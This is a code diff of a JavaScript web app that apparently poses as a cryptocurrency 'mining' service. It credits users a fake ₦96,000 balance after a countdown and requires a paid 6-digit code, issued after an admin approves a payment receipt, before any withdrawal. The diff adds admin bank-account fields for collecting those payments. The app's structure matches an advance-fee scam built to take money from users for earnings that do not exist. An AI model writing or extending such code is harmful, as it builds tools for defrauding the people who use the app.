+                count--; document.getElementById('countdown-timer').innerText = count;
                 if (count <= 0) {
                     clearInterval(timer);
                     document.getElementById('mining-spinner-box').classList.add('hidden');
                     document.getElementById('mining-success-box').classList.remove('hidden');
-                    currentUser.balance += 96000; 
-                    currentUser.hasMined = true; 
-                    currentUser.totalMined = (currentUser.totalMined || 0) + 96000;
+                    currentUser.balance += 96000; currentUser.hasMined = true; currentUser.totalMined = (currentUser.totalMined || 0) + 96000;
                     if(!currentUser.history) currentUser.history = [];
                     currentUser.history.unshift(`Mined +₦96,000 on ${new Date().toLocaleTimeString()}`);
-                    saveUser(); 
-                    updateDashboardUI();
+                    saveUser(); updateDashboardUI();
                 }
             }, 1000);
         }
@@ -446,29 +570,20 @@
 
         function submitPin() {
             if (currentPin.length !== 6) { alert("Please enter a 6-digit code."); return; }
-            
-            // Check if code matches the exact generated valid code and that it isn't null.
             if (systemSettings.validCode !== null && currentPin === systemSettings.validCode) {
                 const withdrawAmt = parseFloat(document.getElementById('with-amount').value) || 96000;
-                currentUser.balance -= withdrawAmt;
-                currentUser.totalWithdrawn = (currentUser.totalWithdrawn || 0) + withdrawAmt;
+                currentUser.balance -= withdrawAmt; currentUser.totalWithdrawn = (currentUser.totalWithdrawn || 0) + withdrawAmt;
                 if(!currentUser.history) currentUser.history = [];
                 currentUser.history.unshift(`Withdrew -₦${withdrawAmt.toLocaleString()} on ${new Date().toLocaleTimeString()}`);
                 
-                // DELETES THE CODE ONCE USED SO IT CANNOT BE REUSED
                 systemSettings.validCode = null; 
-                
-                saveUser(); 
-                updateDashboardUI();
+                saveUser(); updateDashboardUI();
                 
                 alert("Withdrawal Processed Successfully!");
-                currentPin = ""; 
-                pressKey(''); 
-                navigate('page-dashboard');
+                currentPin = ""; pressKey(''); navigate('page-dashboard');
             } else { 
                 document.getElementById('modal-wrong-code').classList.remove('hidden'); 
-                currentPin = ""; 
-                pressKey(''); 
+                currentPin = ""; pressKey(''); 
             }
         }
 
@@ -481,25 +596,28 @@
 
         function submitPayment() {
             alert("Receipt submitted! Waiting for Admin approval.");
-            localStorage.setItem('pending_payment', 'true'); 
-            navigate('page-dashboard');
+            localStorage.setItem('pending_payment', 'true'); navigate('page-dashboard');
         }
 
         function saveAdminSettings() {
             systemSettings.codePrice = document.getElementById('set-code-price').value;
             systemSettings.telegramLink = document.getElementById('set-telegram-link').value.trim();
-            saveUser(); 
-            updateDashboardUI(); 
-            alert("Admin settings updated successfully!");
+            systemSettings.adminBank = document.getElementById('set-admin-bank').value.trim();
+            systemSettings.adminAcct = document.getElementById('set-admin-acct').value.trim();
+            systemSettings.adminName = document.getElementById('set-admin-name').value.trim();
+            
+            saveUser(); updateDashboardUI(); alert("Admin settings updated successfully!");
         }
 
         function approvePayment() {
             const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
             systemSettings.validCode = generatedCode; 
             localStorage.removeItem('pending_payment'); 
-            saveUser();
-            updateDashboardUI();
-            alert(`Payment Approved! Generated 6-Digit Code: ${generatedCode}\nThis code is now visible on the user's Dashboard.`);
+            saveUser(); updateDashboardUI();
+            
+            // ALERT UPDATE: Only tells Admin it is approved. Does NOT show the code to the admin anymore.
+            alert("✅ PAYMENT APPROVED!\n\nThe code has been securely generated and assigned to the user. They will see it automatically when they visit their 'Enter Code' screen.");
+            
             document.getElementById('pending-list').innerText = "No pending payments."; 
             document.getElementById('btn-approve').style.display = 'none';
         }
